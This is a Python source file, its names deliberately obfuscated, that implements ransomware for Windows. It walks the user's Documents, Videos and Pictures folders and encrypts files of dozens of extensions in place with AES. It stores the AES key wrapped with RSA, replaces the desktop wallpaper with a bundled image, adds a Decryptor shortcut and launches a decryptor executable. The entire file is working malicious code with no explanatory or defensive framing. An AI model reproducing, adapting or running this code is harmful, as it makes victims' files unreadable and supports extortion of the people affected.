import os #line:1
import shutil #line:2
import subprocess #line:3
import sys #line:4
import ctypes #line:5
import hashlib #line:6
import win32com .client #line:7
from Crypto .Cipher import AES #line:8
from Crypto .Util .Padding import pad #line:9
import rsa #line:10
extensions_we_love =["txt","doc","docx","xls","xlsx","ppt","pptx","odt","jpg","png","csv","sql","mdb","sln","php","asp","aspx","html","xml","psd","mkv","mp4","zip","pdf","gif","rar","jpeg","avi","info","pak","mp3","m4a","docx#","m4v","7z","mov","wav","apk","key","srt","amr","3ga","rtf","bmp","jpg","wmv"]#line:17
absolute_path =os .path .expanduser ('~\\chr')#line:18
def __OO0000OOOOOOO00O0 (O0OOOOOOO00O0OO0O ):#line:20
    O0OOOO00O0000OOOO ,O0O0O0OOOOOO0OOOO =rsa .newkeys (2048 )#line:22
    O0OOOOOOO00O0OO0O =rsa .encrypt (O0OOOOOOO00O0OO0O ,O0OOOO00O0000OOOO )#line:23
    try :#line:25
        with open (os .path .join (absolute_path ,"encryptedWithRSA.aeskey"),"wb")as OO00OOOO0O0000O00 :#line:26
            OO00OOOO0O0000O00 .write (O0OOOOOOO00O0OO0O )#line:27
        try :#line:29
            with open (os .path .expanduser ("~\\Desktop\\simple_private.rsakey"),"w",encoding ="utf-8")as OO00OOOO0O0000O00 :#line:30
                OO00OOOO0O0000O00 .write (str (O0O0O0OOOOOO0OOOO .n )+"\n"+str (O0O0O0OOOOOO0OOOO .e )+"\n"+str (O0O0O0OOOOOO0OOOO .d )+"\n"+str (O0O0O0OOOOOO0OOOO .p )+"\n"+str (O0O0O0OOOOOO0OOOO .q ))#line:31
        except :#line:32
            with open (os .path .join (absolute_path ,"simple_private.rsakey"),"w",encoding ="utf-8")as OO00OOOO0O0000O00 :#line:33
                OO00OOOO0O0000O00 .write (str (O0O0O0OOOOOO0OOOO .n )+"\n"+str (O0O0O0OOOOOO0OOOO .e )+"\n"+str (O0O0O0OOOOOO0OOOO .d )+"\n"+str (O0O0O0OOOOOO0OOOO .p )+"\n"+str (O0O0O0OOOOOO0OOOO .q ))#line:34
    except :#line:35
        __O0000OOO0OOOO00O0 ()#line:36
    return #line:38
def __O0O000OO00O00O0O0 (O000OO000000O000O ):#line:40
    global extensions_we_love #line:41
    O0O000O0OOOO0OO0O =[]#line:42
    for O00OOO0O0O000O0O0 ,OOO00O00O0000O0O0 ,O00OO00OOOO0OOO00 in os .walk (O000OO000000O000O ):#line:44
        for O000O00O00OOO0O00 in O00OO00OOOO0OOO00 :#line:45
            O0O00000O00O00O00 ,OOOOOOOOO0O00OOO0 =os .path .splitext (os .path .join (O00OOO0O0O000O0O0 ,O000O00O00OOO0O00 ))#line:46
            OOOOOOOOO0O00OOO0 =OOOOOOOOO0O00OOO0 [1 :]#line:47
            if OOOOOOOOO0O00OOO0 .lower ()in extensions_we_love :#line:48
                O0O000O0OOOO0OO0O .append (os .path .join (O00OOO0O0O000O0O0 ,O000O00O00OOO0O00 ))#line:49
    return O0O000O0OOOO0OO0O #line:51
def __O0OOOOOO0OO0OOO00 (O00000000O0O00OO0 ,OOO00OO0O0OOO00OO ):#line:53
    OOO00OOO00OOO00OO =AES .new (OOO00OO0O0OOO00OO ,AES .MODE_ECB )#line:54
    return OOO00OOO00OOO00OO .encrypt (O00000000O0O00OO0 )#line:55
def __OOOOOOOOO00OO000O (*O0OO000OO0O00O000 ):#line:57
    O000OOOOO00O0O0OO =hashlib .sha256 (os .urandom (32 )).digest ()#line:58
    __OO0000OOOOOOO00O0 (O000OOOOO00O0O0OO )#line:59
    if not os .path .isfile (os .path .join (absolute_path ,"encryptedWithRSA.aeskey")):#line:61
        __O0000OOO0OOOO00O0 ()#line:62
    O00OO0O0OO00000O0 =list ()#line:64
    for O000OOOOOO0000000 in O0OO000OO0O00O000 :#line:66
        O00OO0O0OO00000O0 +=__O0O000OO00O00O0O0 (O000OOOOOO0000000 )#line:67
    __OO000O0OOOOO0OOO0 (os .path .join (absolute_path ,"files.txt"))#line:69
    __OO000O0OOOOO0OOO0 (os .path .join (absolute_path ,"errors.txt"))#line:70
    O00000000O00O0O0O =True #line:72
    for OO0OO00OO0OOOO0O0 in O00OO0O0OO00000O0 :#line:73
        if __O000O0OOO0OO0O0OO (OO0OO00OO0OOOO0O0 ,O000OOOOO00O0O0OO ):#line:74
            O00000000O00O0O0O =False #line:75
    if O00000000O00O0O0O :#line:77
        __O0000OOO0OOOO00O0 ()#line:78
    return True #line:80
def __O000O0OOO0OO0O0OO (O00OOOOO0O0OOO0OO ,OOOOOO0OOOO000OOO ):#line:82
    OO0OO0O0O0O000OO0 =AES .new (OOOOOO0OOOO000OOO ,AES .MODE_CBC )#line:83
    try :#line:85
        with open (O00OOOOO0O0OOO0OO ,"rb")as OOO0O00O0000OO000 :#line:86
            OO00OO000O0OO0000 =OOO0O00O0000OO000 .read ()#line:87
        OO00O00O0OOOO0OO0 =OO0OO0O0O0O000OO0 .encrypt (pad (OO00OO000O0OO0000 ,AES .block_size ))#line:89
        with open (O00OOOOO0O0OOO0OO ,"wb")as O0O0OO0000000O00O :#line:91
            O0O0OO0000000O00O .write (__O0OOOOOO0OO0OOO00 (OO0OO0O0O0O000OO0 .iv ,OOOOOO0OOOO000OOO )+OO00O00O0OOOO0OO0 )#line:92
        with open (os .path .join (absolute_path ,"files.txt"),"a",encoding ="utf-8")as OO00OO0OO0OOOOO00 :#line:94
            OO00OO0OO0OOOOO00 .write (O00OOOOO0O0OOO0OO +"\n")#line:95
    except Exception as O0O0O0O0O000O0OOO :#line:96
        with open (os .path .join (absolute_path ,"errors.txt"),"a",encoding ="utf-8")as O0OO0OOOOOOOO000O :#line:97
            O0OO0OOOOOOOO000O .write ("Failed to encrypt {0}: {1}\n".format (str (O00OOOOO0O0OOO0OO ),str (O0O0O0O0O000O0OOO )))#line:98
        return False #line:99
    return True #line:100
def __O0OO0000O000O0000 (O0OO00OO00OOO00O0 ):#line:102
    OO0O000O0O0O00O00 =os .path .join (absolute_path ,O0OO00OO00OOO00O0 )#line:103
    if os .path .exists (OO0O000O0O0O00O00 ):#line:104
        ctypes .windll .user32 .SystemParametersInfoW (20 ,0 ,OO0O000O0O0O00O00 ,0 )#line:105
        return True #line:106
    else :#line:107
        return False #line:108
def __O00OO0OO00OOOOO0O (O0O0OO00OOOO0OOOO ):#line:110
    OOO00O00O0O0000O0 =getattr (sys ,'_MEIPASS',os .path .dirname (os .path .abspath (__file__ )))#line:111
    return os .path .join (OOO00O00O0O0000O0 ,O0O0OO00OOOO0OOOO )#line:112
def __OOO0O0O00O000O0OO (O0O0000O0OOOOO0OO ,*O0OOOO00OO0000O00 ):#line:114
    try :#line:116
        shutil .copy (__O00OO0OO00OOOOO0O (O0O0000O0OOOOO0OO ),absolute_path )#line:117
    except :#line:118
        __O0000OOO0OOOO00O0 ()#line:119
        return #line:120
    for OO00OOOO0OOO0OOOO in O0OOOO00OO0000O00 :#line:122
        try :#line:123
            shutil .copy (__O00OO0OO00OOOOO0O (OO00OOOO0OOO0OOOO ),absolute_path )#line:124
        except :#line:125
            pass #line:126
    return True #line:128
def __OO000O0OOOOO0OOO0 (OOO0OOO00000000O0 ):#line:130
    try :#line:131
        os .remove (OOO0OOO00000000O0 )#line:132
    except :#line:133
        pass #line:134
    return #line:135
def __O0000OOO0OOOO00O0 ():#line:137
    __OO000O0OOOOO0OOO0 (os .path .join (absolute_path ,"files.txt"))#line:138
    __OO000O0OOOOO0OOO0 (os .path .join (absolute_path ,"errors.txt"))#line:139
    __OO000O0OOOOO0OOO0 (os .path .join (absolute_path ,"encryptedWithRSA.aeskey"))#line:140
    __OO000O0OOOOO0OOO0 (os .path .expanduser ("~\\Desktop\\simple_private.rsakey"))#line:141
    __OO000O0OOOOO0OOO0 (os .path .expanduser ("~\\Desktop\\Decryptor.lnk"))#line:142
    __OO000O0OOOOO0OOO0 (os .path .join (absolute_path ,"simple_private.rsakey"))#line:143
    __OO000O0OOOOO0OOO0 (os .path .join (absolute_path ,"Decryptor.lnk"))#line:144
    __OO000O0OOOOO0OOO0 (os .path .join (absolute_path ,"0.png"))#line:145
    __OO000O0OOOOO0OOO0 (os .path .join (absolute_path ,"1.png"))#line:146
    __OO000O0OOOOO0OOO0 (os .path .join (absolute_path ,"decryptor.exe"))#line:147
    sys .exit ()#line:148
    pass #line:149
def __OOO00OOO0OOOO00O0 ():#line:151
    try :#line:152
        OOO000000000OOO00 =os .path .join (os .path .expanduser ('~\\Desktop\\'),'Decryptor.lnk')#line:153
        O0000OO0O00OO0O0O =win32com .client .Dispatch ("WScript.Shell").CreateShortCut (OOO000000000OOO00 )#line:154
        O0000OO0O00OO0O0O .Targetpath =os .path .join (absolute_path ,"decryptor.exe")#line:155
        O0000OO0O00OO0O0O .save ()#line:156
    except :#line:157
        return False #line:158
    return True #line:159
if not os .path .exists (absolute_path ):#line:161
    os .makedirs (absolute_path )#line:162
__OOO0O0O00O000O0OO ("Decryptor.exe","0.png","1.png")#line:164
__OOOOOOOOO00OO000O (os .path .expanduser ('~\\Documents'),os .path .expanduser ('~\\Videos'),os .path .expanduser ('~\\Pictures'))#line:166
__O0OO0000O000O0000 (os .path .join (absolute_path ,"0.png"))#line:167
with open (os .path .join (absolute_path ,"temp"),"w")as f :#line:168
    f .write (str (os .path .basename (sys .argv [0 ])))#line:169
__OOO00OOO0OOOO00O0 ()#line:171
subprocess .Popen ([os .path .join (absolute_path ,"decryptor.exe")])